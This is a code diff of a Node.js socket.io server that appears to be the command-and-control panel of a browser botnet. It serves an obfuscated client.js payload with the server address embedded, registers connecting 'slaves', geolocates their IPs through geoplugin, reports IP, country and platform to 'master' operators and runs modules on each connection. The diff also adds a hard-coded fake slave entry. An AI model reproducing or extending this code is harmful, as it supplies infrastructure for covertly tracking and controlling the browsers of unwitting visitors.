@@ -16,18 +16,16 @@ let http = require("http").createServer(app);
 let io = require("socket.io")(http);
 
 let control_panel_path = path.join(__dirname, "control_panel", "dist");
-let client_html_path = path.join(__dirname, "..", "client");
+let client_path = path.join(__dirname, "client", "src");
 
 const package = JSON.parse(fs.readFileSync(path.join(__dirname, "..", "package.json")));
 const version = package.version;
 
-//let clientSrc = fs.readFileSync(__dirname + "/../client/client.js");
+let clientSrc = fs.readFileSync(path.join(client_path, "client.js"));
 
 let localIps = ["::1"];
 
 let slaveSockets = [];
-let slaveGeo = {};
-let slaveCountries = [];
 
 const defaultModulesSettings = {
 	onConnectModules: []
@@ -97,14 +95,15 @@ let mod = {
 Modules.importModules(mod);
 
 
-app.use("/", express.static(control_panel_path))
+app.use("/", express.static(control_panel_path));
 
 app.get("/client/client.js", (req, res) => {
 	let payload = `window.nodeJsIp='${serverSettings.host}:${serverSettings.externalPort}';` + clientSrc;
 
-	res.send(obfuscator.obfuscate(payload, obfOpts).getObfuscatedCode());
+	res.send(obfuscator.obfuscate(payload, serverSettings.obfuscatorOptions).getObfuscatedCode());
 	//res.send(payload);
 });
+app.use("/client", express.static(client_path));
 
 Modules.getAllModules().forEach(module => {
 	if (module.widgetPaths[0]) {
@@ -119,30 +118,26 @@ let masters = io.of("/masters");
 
 slaves.on("connect", (socket) => {
 	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);
-
+	
 	// Convert ipv4 "mapped" to ipv6 ips to ipv4
 	let ipP = ipaddr.parse(socket.ip);
 	if (ipP.range() == "ipv4Mapped") socket.ip = ipP.toIPv4Address().toString();
 
+	if (localIps.includes(socket.ip)) socket.ip = "localhost";
+
 	slaveSockets.push(socket);
 
-	//socket.ip = ip ? ip : socket.ip;
-	//socket.platform = ip;
+	socket.once("postConnection", (platform) => {
+		request("http://www.geoplugin.net/json.gp?ip=" + socket.ip, (error, response, body) => {
+			if (body[0] === 'u') console.log(body);
+			let json = JSON.parse(body);
+	
+			socket.country = json["geoplugin_countryName"];
+			socket.platform = platform;
 
-	request("http://www.geoplugin.net/json.gp?ip=" + socket.ip, (error, response, body) => {
-		if (body[0] === 'u') console.log(body);
-		let json = JSON.parse(body);
-
-		if (slaveGeo[json["geoplugin_countryName"]] == null)
-			slaveGeo[json["geoplugin_countryName"]] = [];
-
-		slaveGeo[json["geoplugin_countryName"]].push(socket.ip);
-
-		socket.country = json["geoplugin_countryName"];
-
-		if (slaveCountries.indexOf(socket.country) == -1)
-			slaveCountries.push(socket.country);
-	});
+			masters.emit("slaveUpdate");
+		});
+	})
 
 	modulesSettings.onConnectModules.forEach((name) => {
 		let module = Modules.getModule(name);
@@ -153,13 +148,7 @@ slaves.on("connect", (socket) => {
 		if (slaveSockets.indexOf(socket) != -1) {
 			slaveSockets.pop(socket);
 
-			if (socket.country) {
-				slaveGeo[socket.country].pop(socket);
-
-				if (slaveGeo[socket.country].length == 0)
-					slaveCountries.pop(socket.country);
-
-			}
+			masters.emit("slaveUpdate");
 			console.log("Slave disconnected (" + socket.ip + ")");
 		}
 	});
@@ -168,15 +157,27 @@ slaves.on("connect", (socket) => {
 });
 
 masters.on("connect", (socket) => {
-	socket.on("updateClientData", () => {
+	socket.on("fetchSlaves", () => {
 
 		let data = [];
 
-		for (let i = 0; i < slaveCountries.length; i++) {
-			data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
+		for (let i = 0; i < slaveSockets.length; i++) {
+			let socket = slaveSockets[i];
+
+			data.push({
+				ip: socket.ip,
+				country: socket.country,
+				platform: socket.platform
+			});
 		}
 
-		socket.emit("getClientsData", data, slaveGeo);
+		data.push({
+			ip: "1.1.1.1",
+			country: "Russia",
+			platform: "Atari"
+		});
+
+		socket.emit("fetchSlavesResponse", data);
 	});
 
 	socket.on("getModuleSettings", () => {
